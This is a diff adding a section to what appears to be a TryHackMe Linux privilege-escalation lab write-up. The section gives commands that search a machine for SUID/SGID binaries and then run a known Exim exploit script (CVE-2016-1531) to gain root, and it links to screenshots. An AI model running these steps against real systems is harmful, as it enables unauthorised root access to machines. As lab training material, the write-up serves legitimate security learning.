@@ -417,6 +417,40 @@ exit
 
 
 ### SUID / SGID Executables - Known Exploits
+
+In this task we will abuse known exploits for binaries with their SUID bit set.
+
+*Read and follow along with the above.*
+
+```cmd
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+```cmd
+find / -perm -4000 2> /dev/null
+```
+```cmd
+s -lh tools/suid/exim
+```
+```cmd
+./tools/suid/exim/cve-2016-1531.sh
+```
+```cmd
+touch cve-2016-1531.sh
+nano cve-2016-1531.sh
+```
+```cmd
+chmod +x cve-2016-1531.sh
+./cve-2016-1531.sh
+```
+
+![Auto Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Auto_Root.png)
+![Create Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Create_Script.png)
+![Exploit Database](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Exploit_Database.png)
+![Manual Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Manual_Root.png)
+![Manual Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Manual_Script.png)
+![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Permissions.png)
+![Permissions 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Permissions_2.png)
+
 ### SUID / SGID Executables - Shared Object Injection
 ### SUID / SGID Executables - Environment Variables
 ### SUID / SGID Executables - Abusing Shell Features (#1)
